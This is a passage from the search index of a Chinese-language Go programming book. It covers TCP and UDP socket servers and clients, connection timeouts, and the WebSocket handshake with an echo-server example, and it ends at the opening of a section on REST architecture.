a\uff0c\u662f\u56e0\u4e3a\u5728\u670d\u52a1\u5668\u7aef\u8dd1\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u5f53\u6709\u9519\u8bef\u53d1\u751f\u7684\u60c5\u51b5\u4e0b\u6700\u597d\u662f\u7531\u670d\u52a1\u7aef\u8bb0\u5f55\u9519\u8bef\uff0c\u7136\u540e\u5f53\u524d\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u76f4\u63a5\u62a5\u9519\u800c\u9000\u51fa\uff0c\u4ece\u800c\u4e0d\u4f1a\u5f71\u54cd\u5230\u5f53\u524d\u670d\u52a1\u7aef\u8fd0\u884c\u7684\u6574\u4e2a\u670d\u52a1\u3002</p> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u6709\u4e2a\u7f3a\u70b9\uff0c\u6267\u884c\u7684\u65f6\u5019\u662f\u5355\u4efb\u52a1\u7684\uff0c\u4e0d\u80fd\u540c\u65f6\u63a5\u6536\u591a\u4e2a\u8bf7\u6c42\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u6539\u9020\u4ee5\u4f7f\u5b83\u652f\u6301\u591a\u5e76\u53d1\u5462\uff1fGo\u91cc\u9762\u6709\u4e00\u4e2agoroutine\u673a\u5236\uff0c\u8bf7\u770b\u4e0b\u9762\u6539\u9020\u540e\u7684\u4ee3\u7801 <pre><code>package main\n\nimport (\n\"fmt\"\n\"net\"\n\"os\"\n\"time\"\n)\n\nfunc main() {\nservice := \":1200\"\ntcpAddr, err := net.ResolveTCPAddr(\"tcp4\", service)\ncheckError(err)\nlistener, err := net.ListenTCP(\"tcp\", tcpAddr)\ncheckError(err)\nfor {\nconn, err := listener.Accept()\nif err != nil {\ncontinue\n}\ngo handleClient(conn)\n}\n}\n\nfunc handleClient(conn net.Conn) {\ndefer conn.Close()\ndaytime := time.Now().String()\nconn.Write([]byte(daytime)) // don't care about return value\n// we're finished with this client\n}\nfunc checkError(err error) {\nif err != nil {\nfmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error())\nos.Exit(1)\n}\n}\n</code></pre> \u901a\u8fc7\u628a\u4e1a\u52a1\u5904\u7406\u5206\u79bb\u5230\u51fd\u6570<code>handleClient</code>\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5730\u5b9e\u73b0\u591a\u5e76\u53d1\u6267\u884c\u4e86\u3002\u770b\u4e0a\u53bb\u662f\u4e0d\u662f\u5f88\u5e05\uff0c\u589e\u52a0<code>go</code>\u5173\u952e\u8bcd\u5c31\u5b9e\u73b0\u4e86\u670d\u52a1\u7aef\u7684\u591a\u5e76\u53d1\uff0c\u4ece\u8fd9\u4e2a\u5c0f\u4f8b\u5b50\u4e5f\u53ef\u4ee5\u770b\u51fagoroutine\u7684\u5f3a\u5927\u4e4b\u5904\u3002</p> <p>\u6709\u7684\u670b\u53cb\u53ef\u80fd\u8981\u95ee\uff1a\u8fd9\u4e2a\u670d\u52a1\u7aef\u6ca1\u6709\u5904\u7406\u5ba2\u6237\u7aef\u5b9e\u9645\u8bf7\u6c42\u7684\u5185\u5bb9\u3002\u5982\u679c\u6211\u4eec\u9700\u8981\u901a\u8fc7\u4ece\u5ba2\u6237\u7aef\u53d1\u9001\u4e0d\u540c\u7684\u8bf7\u6c42\u6765\u83b7\u53d6\u4e0d\u540c\u7684\u65f6\u95f4\u683c\u5f0f\uff0c\u800c\u4e14\u9700\u8981\u4e00\u4e2a\u957f\u8fde\u63a5\uff0c\u8be5\u600e\u4e48\u505a\u5462\uff1f\u8bf7\u770b\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"net\"\n\"os\"\n\"time\"\n\"strconv\"\n\"strings\"\n)\n\nfunc main() {\nservice := \":1200\"\ntcpAddr, err := net.ResolveTCPAddr(\"tcp4\", service)\ncheckError(err)\nlistener, err := net.ListenTCP(\"tcp\", tcpAddr)\ncheckError(err)\nfor {\nconn, err := listener.Accept()\nif err != nil {\ncontinue\n}\ngo handleClient(conn)\n}\n}\n\nfunc handleClient(conn net.Conn) {\nconn.SetReadDeadline(time.Now().Add(2 * time.Minute)) // set 2 minutes timeout\nrequest := make([]byte, 128) // set maxium request length to 128B to prevent flood attack\ndefer conn.Close()  // close connection before exit\nfor {\nread_len, err := conn.Read(request)\n\nif err != nil {\nfmt.Println(err)\nbreak\n}\n\nif read_len == 0 {\nbreak // connection already closed by client\n} else if strings.TrimSpace(string(request[:read_len])) == \"timestamp\" {\ndaytime := strconv.FormatInt(time.Now().Unix(), 10)\nconn.Write([]byte(daytime))\n} else {\ndaytime := time.Now().String()\nconn.Write([]byte(daytime))\n}\n\nrequest = make([]byte, 128) // clear last read content\n}\n}\n\nfunc checkError(err error) {\nif err != nil {\nfmt.Fprintf(os.Stderr, \"Fatal error: %s\", err.Error())\nos.Exit(1)\n}\n}\n</code></pre> \u5728\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528<code>conn.Read()</code>\u4e0d\u65ad\u8bfb\u53d6\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u8bf7\u6c42\u3002\u7531\u4e8e\u6211\u4eec\u9700\u8981\u4fdd\u6301\u4e0e\u5ba2\u6237\u7aef\u7684\u957f\u8fde\u63a5\uff0c\u6240\u4ee5\u4e0d\u80fd\u5728\u8bfb\u53d6\u5b8c\u4e00\u6b21\u8bf7\u6c42\u540e\u5c31\u5173\u95ed\u8fde\u63a5\u3002\u7531\u4e8e<code>conn.SetReadDeadline()</code>\u8bbe\u7f6e\u4e86\u8d85\u65f6\uff0c\u5f53\u4e00\u5b9a\u65f6\u95f4\u5185\u5ba2\u6237\u7aef\u65e0\u8bf7\u6c42\u53d1\u9001\uff0c<code>conn</code>\u4fbf\u4f1a\u81ea\u52a8\u5173\u95ed\uff0c\u4e0b\u9762\u7684for\u5faa\u73af\u5373\u4f1a\u56e0\u4e3a\u8fde\u63a5\u5df2\u5173\u95ed\u800c\u8df3\u51fa\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c<code>request</code>\u5728\u521b\u5efa\u65f6\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u6700\u5927\u957f\u5ea6\u4ee5\u9632\u6b62flood attack\uff1b\u6bcf\u6b21\u8bfb\u53d6\u5230\u8bf7\u6c42\u5904\u7406\u5b8c\u6bd5\u540e\uff0c\u9700\u8981\u6e05\u7406request\uff0c\u56e0\u4e3a<code>conn.Read()</code>\u4f1a\u5c06\u65b0\u8bfb\u53d6\u5230\u7684\u5185\u5bb9append\u5230\u539f\u5185\u5bb9\u4e4b\u540e\u3002</p>"},{"location":"08.1/#tcp","title":"\u63a7\u5236TCP\u8fde\u63a5","text":"<p>TCP\u6709\u5f88\u591a\u8fde\u63a5\u63a7\u5236\u51fd\u6570\uff0c\u6211\u4eec\u5e73\u5e38\u7528\u5230\u6bd4\u8f83\u591a\u7684\u6709\u5982\u4e0b\u51e0\u4e2a\u51fd\u6570\uff1a <pre><code>func DialTimeout(net, addr string, timeout time.Duration) (Conn, error)\n</code></pre> \u8bbe\u7f6e\u5efa\u7acb\u8fde\u63a5\u7684\u8d85\u65f6\u65f6\u95f4\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u90fd\u9002\u7528\uff0c\u5f53\u8d85\u8fc7\u8bbe\u7f6e\u65f6\u95f4\u65f6\uff0c\u8fde\u63a5\u81ea\u52a8\u5173\u95ed\u3002 <pre><code>func (c *TCPConn) SetReadDeadline(t time.Time) error\nfunc (c *TCPConn) SetWriteDeadline(t time.Time) error\n</code></pre> \u7528\u6765\u8bbe\u7f6e\u5199\u5165/\u8bfb\u53d6\u4e00\u4e2a\u8fde\u63a5\u7684\u8d85\u65f6\u65f6\u95f4\u3002\u5f53\u8d85\u8fc7\u8bbe\u7f6e\u65f6\u95f4\u65f6\uff0c\u8fde\u63a5\u81ea\u52a8\u5173\u95ed\u3002 <pre><code>func (c *TCPConn) SetKeepAlive(keepalive bool) os.Error\n</code></pre> \u8bbe\u7f6ekeepAlive\u5c5e\u6027\u3002\u64cd\u4f5c\u7cfb\u7edf\u5c42\u5728tcp\u4e0a\u6ca1\u6709\u6570\u636e\u548cACK\u7684\u65f6\u5019\uff0c\u4f1a\u95f4\u9694\u6027\u7684\u53d1\u9001keepalive\u5305\uff0c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u901a\u8fc7\u8be5\u5305\u6765\u5224\u65ad\u4e00\u4e2atcp\u8fde\u63a5\u662f\u5426\u5df2\u7ecf\u65ad\u5f00\uff0c\u5728windows\u4e0a\u9ed8\u8ba42\u4e2a\u5c0f\u65f6\u6ca1\u6709\u6536\u5230\u6570\u636e\u548ckeepalive\u5305\u7684\u65f6\u5019\u8ba4\u4e3atcp\u8fde\u63a5\u5df2\u7ecf\u65ad\u5f00\uff0c\u8fd9\u4e2a\u529f\u80fd\u548c\u6211\u4eec\u901a\u5e38\u5728\u5e94\u7528\u5c42\u52a0\u7684\u5fc3\u8df3\u5305\u7684\u529f\u80fd\u7c7b\u4f3c\u3002</p> <p>\u66f4\u591a\u7684\u5185\u5bb9\u8bf7\u67e5\u770b<code>net</code>\u5305\u7684\u6587\u6863\u3002</p>"},{"location":"08.1/#udp-socket","title":"UDP Socket","text":"<p>Go\u8bed\u8a00\u5305\u4e2d\u5904\u7406UDP Socket\u548cTCP Socket\u4e0d\u540c\u7684\u5730\u65b9\u5c31\u662f\u5728\u670d\u52a1\u5668\u7aef\u5904\u7406\u591a\u4e2a\u5ba2\u6237\u7aef\u8bf7\u6c42\u6570\u636e\u5305\u7684\u65b9\u5f0f\u4e0d\u540c,UDP\u7f3a\u5c11\u4e86\u5bf9\u5ba2\u6237\u7aef\u8fde\u63a5\u8bf7\u6c42\u7684Accept\u51fd\u6570\u3002\u5176\u4ed6\u57fa\u672c\u51e0\u4e4e\u4e00\u6a21\u4e00\u6837\uff0c\u53ea\u6709TCP\u6362\u6210\u4e86UDP\u800c\u5df2\u3002UDP\u7684\u51e0\u4e2a\u4e3b\u8981\u51fd\u6570\u5982\u4e0b\u6240\u793a\uff1a <pre><code>func ResolveUDPAddr(net, addr string) (*UDPAddr, os.Error)\nfunc DialUDP(net string, laddr, raddr *UDPAddr) (c *UDPConn, err os.Error)\nfunc ListenUDP(net string, laddr *UDPAddr) (c *UDPConn, err os.Error)\nfunc (c *UDPConn) ReadFromUDP(b []byte) (n int, addr *UDPAddr, err os.Error)\nfunc (c *UDPConn) WriteToUDP(b []byte, addr *UDPAddr) (n int, err os.Error)\n</code></pre> \u4e00\u4e2aUDP\u7684\u5ba2\u6237\u7aef\u4ee3\u7801\u5982\u4e0b\u6240\u793a,\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e0d\u540c\u7684\u5c31\u662fTCP\u6362\u6210\u4e86UDP\u800c\u5df2\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"net\"\n\"os\"\n)\n\nfunc main() {\nif len(os.Args) != 2 {\nfmt.Fprintf(os.Stderr, \"Usage: %s host:port\", os.Args[0])\nos.Exit(1)\n}\nservice := os.Args[1]\nudpAddr, err := net.ResolveUDPAddr(\"udp4\", service)\ncheckError(err)\nconn, err := net.DialUDP(\"udp\", nil, udpAddr)\ncheckError(err)\n_, err = conn.Write([]byte(\"anything\"))\ncheckError(err)\nvar buf [512]byte\nn, err := conn.Read(buf[0:])\ncheckError(err)\nfmt.Println(string(buf[0:n]))\nos.Exit(0)\n}\nfunc checkError(err error) {\nif err != nil {\nfmt.Fprintf(os.Stderr, \"Fatal error %s\", err.Error())\nos.Exit(1)\n}\n}\n</code></pre> \u6211\u4eec\u6765\u770b\u4e00\u4e0bUDP\u670d\u52a1\u5668\u7aef\u5982\u4f55\u6765\u5904\u7406\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"net\"\n\"os\"\n\"time\"\n)\n\nfunc main() {\nservice := \":1200\"\nudpAddr, err := net.ResolveUDPAddr(\"udp4\", service)\ncheckError(err)\nconn, err := net.ListenUDP(\"udp\", udpAddr)\ncheckError(err)\nfor {\nhandleClient(conn)\n}\n}\nfunc handleClient(conn *net.UDPConn) {\nvar buf [512]byte\n_, addr, err := conn.ReadFromUDP(buf[0:])\nif err != nil {\nreturn\n}\ndaytime := time.Now().String()\nconn.WriteToUDP([]byte(daytime), addr)\n}\nfunc checkError(err error) {\nif err != nil {\nfmt.Fprintf(os.Stderr, \"Fatal error %s\", err.Error())\nos.Exit(1)\n}\n}\n</code></pre></p>"},{"location":"08.1/#_1","title":"\u603b\u7ed3","text":"<p>\u901a\u8fc7\u5bf9TCP\u548cUDP Socket\u7f16\u7a0b\u7684\u63cf\u8ff0\u548c\u5b9e\u73b0\uff0c\u53ef\u89c1Go\u5df2\u7ecf\u5b8c\u5907\u5730\u652f\u6301\u4e86Socket\u7f16\u7a0b\uff0c\u800c\u4e14\u4f7f\u7528\u8d77\u6765\u76f8\u5f53\u7684\u65b9\u4fbf\uff0cGo\u63d0\u4f9b\u4e86\u5f88\u591a\u51fd\u6570\uff0c\u901a\u8fc7\u8fd9\u4e9b\u51fd\u6570\u53ef\u4ee5\u5f88\u5bb9\u6613\u5c31\u7f16\u5199\u51fa\u9ad8\u6027\u80fd\u7684Socket\u5e94\u7528\u3002</p>"},{"location":"08.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Web\u670d\u52a1</li> <li>\u4e0b\u4e00\u8282: WebSocket</li> </ul>"},{"location":"08.2/","title":"8.2 WebSocket","text":"<p>WebSocket\u662fHTML5\u7684\u91cd\u8981\u7279\u6027\uff0c\u5b83\u5b9e\u73b0\u4e86\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684\u8fdc\u7a0bsocket\uff0c\u5b83\u4f7f\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u53ef\u4ee5\u8fdb\u884c\u5168\u53cc\u5de5\u901a\u4fe1\uff0c\u8bb8\u591a\u6d4f\u89c8\u5668\uff08Firefox\u3001Google Chrome\u548cSafari\uff09\u90fd\u5df2\u5bf9\u6b64\u505a\u4e86\u652f\u6301\u3002</p> <p>\u5728WebSocket\u51fa\u73b0\u4e4b\u524d\uff0c\u4e3a\u4e86\u5b9e\u73b0\u5373\u65f6\u901a\u4fe1\uff0c\u91c7\u7528\u7684\u6280\u672f\u90fd\u662f\u201c\u8f6e\u8be2\u201d\uff0c\u5373\u5728\u7279\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u5185\uff0c\u7531\u6d4f\u89c8\u5668\u5bf9\u670d\u52a1\u5668\u53d1\u51faHTTP Request\uff0c\u670d\u52a1\u5668\u5728\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u8fd4\u56de\u6700\u65b0\u7684\u6570\u636e\u7ed9\u6d4f\u89c8\u5668\u5237\u65b0\uff0c\u201c\u8f6e\u8be2\u201d\u4f7f\u5f97\u6d4f\u89c8\u5668\u9700\u8981\u5bf9\u670d\u52a1\u5668\u4e0d\u65ad\u53d1\u51fa\u8bf7\u6c42\uff0c\u8fd9\u6837\u4f1a\u5360\u7528\u5927\u91cf\u5e26\u5bbd\u3002</p> <p>WebSocket\u91c7\u7528\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u62a5\u5934\uff0c\u4f7f\u5f97\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u53ea\u9700\u8981\u505a\u4e00\u4e2a\u63e1\u624b\u7684\u52a8\u4f5c\uff0c\u5c31\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u5efa\u7acb\u4e00\u6761\u8fde\u63a5\u901a\u9053\u3002\u4e14\u6b64\u8fde\u63a5\u4f1a\u4fdd\u6301\u5728\u6d3b\u52a8\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528JavaScript\u6765\u5411\u8fde\u63a5\u5199\u5165\u6216\u4ece\u4e2d\u63a5\u6536\u6570\u636e\uff0c\u5c31\u50cf\u5728\u4f7f\u7528\u4e00\u4e2a\u5e38\u89c4\u7684TCP Socket\u4e00\u6837\u3002\u5b83\u89e3\u51b3\u4e86Web\u5b9e\u65f6\u5316\u7684\u95ee\u9898\uff0c\u76f8\u6bd4\u4f20\u7edfHTTP\u6709\u5982\u4e0b\u597d\u5904\uff1a</p> <ul> <li>\u4e00\u4e2aWeb\u5ba2\u6237\u7aef\u53ea\u5efa\u7acb\u4e00\u4e2aTCP\u8fde\u63a5</li> <li>Websocket\u670d\u52a1\u7aef\u53ef\u4ee5\u63a8\u9001(push)\u6570\u636e\u5230web\u5ba2\u6237\u7aef.</li> <li>\u6709\u66f4\u52a0\u8f7b\u91cf\u7ea7\u7684\u5934\uff0c\u51cf\u5c11\u6570\u636e\u4f20\u9001\u91cf</li> </ul> <p>WebSocket URL\u7684\u8d77\u59cb\u8f93\u5165\u662fws://\u6216\u662fwss://\uff08\u5728SSL\u4e0a\uff09\u3002\u4e0b\u56fe\u5c55\u793a\u4e86WebSocket\u7684\u901a\u4fe1\u8fc7\u7a0b\uff0c\u4e00\u4e2a\u5e26\u6709\u7279\u5b9a\u62a5\u5934\u7684HTTP\u63e1\u624b\u88ab\u53d1\u9001\u5230\u4e86\u670d\u52a1\u5668\u7aef\uff0c\u63a5\u7740\u5728\u670d\u52a1\u5668\u7aef\u6216\u662f\u5ba2\u6237\u7aef\u5c31\u53ef\u4ee5\u901a\u8fc7JavaScript\u6765\u4f7f\u7528\u67d0\u79cd\u5957\u63a5\u53e3\uff08socket\uff09\uff0c\u8fd9\u4e00\u5957\u63a5\u53e3\u53ef\u88ab\u7528\u6765\u901a\u8fc7\u4e8b\u4ef6\u53e5\u67c4\u5f02\u6b65\u5730\u63a5\u6536\u6570\u636e\u3002</p> <p></p> <p>\u56fe8.2 WebSocket\u539f\u7406\u56fe</p>"},{"location":"08.2/#websocket","title":"WebSocket\u539f\u7406","text":"<p>WebSocket\u7684\u534f\u8bae\u9887\u4e3a\u7b80\u5355\uff0c\u5728\u7b2c\u4e00\u6b21handshake\u901a\u8fc7\u4ee5\u540e\uff0c\u8fde\u63a5\u4fbf\u5efa\u7acb\u6210\u529f\uff0c\u5176\u540e\u7684\u901a\u8baf\u6570\u636e\u90fd\u662f\u4ee5\u201d\\x00\u2033\u5f00\u5934\uff0c\u4ee5\u201d\\xFF\u201d\u7ed3\u5c3e\u3002\u5728\u5ba2\u6237\u7aef\uff0c\u8fd9\u4e2a\u662f\u900f\u660e\u7684\uff0cWebSocket\u7ec4\u4ef6\u4f1a\u81ea\u52a8\u5c06\u539f\u59cb\u6570\u636e\u201c\u6390\u5934\u53bb\u5c3e\u201d\u3002</p> <p>\u6d4f\u89c8\u5668\u53d1\u51faWebSocket\u8fde\u63a5\u8bf7\u6c42\uff0c\u7136\u540e\u670d\u52a1\u5668\u53d1\u51fa\u56de\u5e94\uff0c\u7136\u540e\u8fde\u63a5\u5efa\u7acb\u6210\u529f\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u901a\u5e38\u79f0\u4e3a\u201c\u63e1\u624b\u201d (handshaking)\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u8bf7\u6c42\u548c\u53cd\u9988\u4fe1\u606f\uff1a</p> <p></p> <p>\u56fe8.3 WebSocket\u7684request\u548cresponse\u4fe1\u606f</p> <p>\u5728\u8bf7\u6c42\u4e2d\u7684\"Sec-WebSocket-Key\"\u662f\u968f\u673a\u7684\uff0c\u5bf9\u4e8e\u6574\u5929\u8ddf\u7f16\u7801\u6253\u4ea4\u9053\u7684\u7a0b\u5e8f\u5458\uff0c\u4e00\u773c\u5c31\u53ef\u4ee5\u770b\u51fa\u6765\uff1a\u8fd9\u4e2a\u662f\u4e00\u4e2a\u7ecf\u8fc7base64\u7f16\u7801\u540e\u7684\u6570\u636e\u3002\u670d\u52a1\u5668\u7aef\u63a5\u6536\u5230\u8fd9\u4e2a\u8bf7\u6c42\u4e4b\u540e\u9700\u8981\u628a\u8fd9\u4e2a\u5b57\u7b26\u4e32\u8fde\u63a5\u4e0a\u4e00\u4e2a\u56fa\u5b9a\u7684\u5b57\u7b26\u4e32\uff1a</p> <pre><code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11\n</code></pre> <p>\u5373\uff1a<code>f7cb4ezEAl6C3wRaU6JORA==</code>\u8fde\u63a5\u4e0a\u90a3\u4e00\u4e32\u56fa\u5b9a\u5b57\u7b26\u4e32\uff0c\u751f\u6210\u4e00\u4e2a\u8fd9\u6837\u7684\u5b57\u7b26\u4e32\uff1a</p> <pre><code>f7cb4ezEAl6C3wRaU6JORA==258EAFA5-E914-47DA-95CA-C5AB0DC85B11\n</code></pre> <p>\u5bf9\u8be5\u5b57\u7b26\u4e32\u5148\u7528 sha1\u5b89\u5168\u6563\u5217\u7b97\u6cd5\u8ba1\u7b97\u51fa\u4e8c\u8fdb\u5236\u7684\u503c\uff0c\u7136\u540e\u7528base64\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\uff0c\u5373\u53ef\u4ee5\u5f97\u5230\u63e1\u624b\u540e\u7684\u5b57\u7b26\u4e32\uff1a</p> <pre><code>rE91AJhfC+6JdVcVXOGJEADEJdQ=\n</code></pre> <p>\u5c06\u4e4b\u4f5c\u4e3a\u54cd\u5e94\u5934<code>Sec-WebSocket-Accept</code>\u7684\u503c\u53cd\u9988\u7ed9\u5ba2\u6237\u7aef\u3002</p>"},{"location":"08.2/#gowebsocket","title":"Go\u5b9e\u73b0WebSocket","text":"<p>Go\u8bed\u8a00\u6807\u51c6\u5305\u91cc\u9762\u6ca1\u6709\u63d0\u4f9b\u5bf9WebSocket\u7684\u652f\u6301\uff0c\u4f46\u662f\u5728\u7531\u5b98\u65b9\u7ef4\u62a4\u7684go.net\u5b50\u5305\u4e2d\u6709\u5bf9\u8fd9\u4e2a\u7684\u652f\u6301\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u547d\u4ee4\u83b7\u53d6\u8be5\u5305\uff1a</p> <pre><code>go get golang.org/x/net/websocket\n</code></pre> <p>WebSocket\u5206\u4e3a\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c06\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50:\u7528\u6237\u8f93\u5165\u4fe1\u606f\uff0c\u5ba2\u6237\u7aef\u901a\u8fc7WebSocket\u5c06\u4fe1\u606f\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7aef\uff0c\u670d\u52a1\u5668\u7aef\u6536\u5230\u4fe1\u606f\u4e4b\u540e\u4e3b\u52a8Push\u4fe1\u606f\u5230\u5ba2\u6237\u7aef\uff0c\u7136\u540e\u5ba2\u6237\u7aef\u5c06\u8f93\u51fa\u5176\u6536\u5230\u7684\u4fe1\u606f\uff0c\u5ba2\u6237\u7aef\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p><pre><code>&lt;html&gt;\n&lt;head&gt;&lt;/head&gt;\n&lt;body&gt;\n    &lt;script type=\"text/javascript\"&gt;\nvar sock = null;\nvar wsuri = \"ws://127.0.0.1:1234\";\n\nwindow.onload = function() {\n\nconsole.log(\"onload\");\n\nsock = new WebSocket(wsuri);\n\nsock.onopen = function() {\nconsole.log(\"connected to \" + wsuri);\n}\n\nsock.onclose = function(e) {\nconsole.log(\"connection closed (\" + e.code + \")\");\n}\n\nsock.onmessage = function(e) {\nconsole.log(\"message received: \" + e.data);\n}\n};\n\nfunction send() {\nvar msg = document.getElementById('message').value;\nsock.send(msg);\n};\n&lt;/script&gt;\n    &lt;h1&gt;WebSocket Echo Test&lt;/h1&gt;\n    &lt;form&gt;\n        &lt;p&gt;\n            Message: &lt;input id=\"message\" type=\"text\" value=\"Hello, world!\"&gt;\n        &lt;/p&gt;\n    &lt;/form&gt;\n    &lt;button onclick=\"send();\"&gt;Send Message&lt;/button&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> \u53ef\u4ee5\u770b\u5230\u5ba2\u6237\u7aefJS\uff0c\u5f88\u5bb9\u6613\u7684\u5c31\u901a\u8fc7WebSocket\u51fd\u6570\u5efa\u7acb\u4e86\u4e00\u4e2a\u4e0e\u670d\u52a1\u5668\u7684\u8fde\u63a5sock\uff0c\u5f53\u63e1\u624b\u6210\u529f\u540e\uff0c\u4f1a\u89e6\u53d1WebSocket\u5bf9\u8c61\u7684onopen\u4e8b\u4ef6\uff0c\u544a\u8bc9\u5ba2\u6237\u7aef\u8fde\u63a5\u5df2\u7ecf\u6210\u529f\u5efa\u7acb\u3002\u5ba2\u6237\u7aef\u4e00\u5171\u7ed1\u5b9a\u4e86\u56db\u4e2a\u4e8b\u4ef6\u3002</p> <ul> <li>1\uff09onopen \u5efa\u7acb\u8fde\u63a5\u540e\u89e6\u53d1</li> <li>2\uff09onmessage \u6536\u5230\u6d88\u606f\u540e\u89e6\u53d1</li> <li>3\uff09onerror \u53d1\u751f\u9519\u8bef\u65f6\u89e6\u53d1</li> <li>4\uff09onclose \u5173\u95ed\u8fde\u63a5\u65f6\u89e6\u53d1</li> </ul> <p>\u6211\u4eec\u670d\u52a1\u5668\u7aef\u7684\u5b9e\u73b0\u5982\u4e0b\uff1a</p> <p><pre><code>package main\n\nimport (\n\"golang.org/x/net/websocket\"\n\"fmt\"\n\"log\"\n\"net/http\"\n)\n\nfunc Echo(ws *websocket.Conn) {\nvar err error\n\nfor {\nvar reply string\n\nif err = websocket.Message.Receive(ws, &amp;reply); err != nil {\nfmt.Println(\"Can't receive\")\nbreak\n}\n\nfmt.Println(\"Received back from client: \" + reply)\n\nmsg := \"Received:  \" + reply\nfmt.Println(\"Sending to client: \" + msg)\n\nif err = websocket.Message.Send(ws, msg); err != nil {\nfmt.Println(\"Can't send\")\nbreak\n}\n}\n}\n\nfunc main() {\nhttp.Handle(\"/\", websocket.Handler(Echo))\n\nif err := http.ListenAndServe(\":1234\", nil); err != nil {\nlog.Fatal(\"ListenAndServe:\", err)\n}\n}\n</code></pre> \u5f53\u5ba2\u6237\u7aef\u5c06\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606fSend\u4e4b\u540e\uff0c\u670d\u52a1\u5668\u7aef\u901a\u8fc7Receive\u63a5\u6536\u5230\u4e86\u76f8\u5e94\u4fe1\u606f\uff0c\u7136\u540e\u901a\u8fc7Send\u53d1\u9001\u4e86\u5e94\u7b54\u4fe1\u606f\u3002</p> <p></p> <p>\u56fe8.4 WebSocket\u670d\u52a1\u5668\u7aef\u63a5\u6536\u5230\u7684\u4fe1\u606f</p> <p>\u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\u6211\u4eec\u770b\u5230\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u5b9e\u73b0WebSocket\u975e\u5e38\u7684\u65b9\u4fbf\uff0cGo\u7684\u6e90\u7801net\u5206\u652f\u4e2d\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u7684\u534f\u8bae\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u62ff\u6765\u7528\uff0c\u76ee\u524d\u968f\u7740HTML5\u7684\u53d1\u5c55\uff0c\u6211\u60f3\u672a\u6765WebSocket\u4f1a\u662fWeb\u5f00\u53d1\u7684\u4e00\u4e2a\u91cd\u70b9\uff0c\u6211\u4eec\u9700\u8981\u50a8\u5907\u8fd9\u65b9\u9762\u7684\u77e5\u8bc6\u3002</p>"},{"location":"08.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Socket\u7f16\u7a0b</li> <li>\u4e0b\u4e00\u8282: REST</li> </ul>"},{"location":"08.3/","title":"8.3 REST","text":"<p>RESTful\uff0c\u662f\u76ee\u524d\u6700\u4e3a\u6d41\u884c\u7684\u4e00\u79cd\u4e92\u8054\u7f51\u8f6f\u4ef6\u67b6\u6784\u3002\u56e0\u4e3a\u5b83\u7ed3\u6784\u6e05\u6670\u3001\u7b26\u5408\u6807\u51c6\u3001\u6613\u4e8e\u7406\u89e3\u3001\u6269\u5c55\u65b9\u4fbf\uff0c\u6240\u4ee5\u6b63\u5f97\u5230\u8d8a\u6765\u8d8a\u591a\u7f51\u7ad9\u7684\u91c7\u7528\u3002\u672c\u5c0f\u8282\u6211\u4eec\u5c06\u6765\u5b66\u4e60\u5b83\u5230\u5e95\u662f\u4e00\u79cd\u4ec0\u4e48\u6837\u7684\u67b6\u6784\uff1f\u4ee5\u53ca\u5728Go\u91cc\u9762\u5982\u4f55\u6765\u5b9e\u73b0\u5b83\u3002</p>"},{"location":"08.3/#rest","title":"\u4ec0\u4e48\u662fREST","text":"<p>REST(REpresentational State Transfer)\u8fd9\u4e2a\u6982\u5ff5\uff0c\u9996\u6b21\u51fa\u73b0\u662f\u5728 2000\u5e74Roy Thomas Fielding\uff08\u4ed6\u662fHTTP\u89c4\u8303\u7684\u4e3b\u8981\u7f16\u5199\u8005\u4e4b\u4e00\uff09\u7684\u535a\u58eb\u8bba\u6587\u4e2d\uff0c\u5b83\u6307\u7684\u662f\u4e00\u7ec4\u67b6\u6784\u7ea6\u675f\u6761\u4ef6\u548c\u539f\u5219\u3002\u6ee1\u8db3\u8fd9\u4e9b\u7ea6\u675f\u6761\u4ef6\u548c\u539f\u5219\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u8bbe\u8ba1\u5c31\u662fRESTful\u7684\u3002</p> 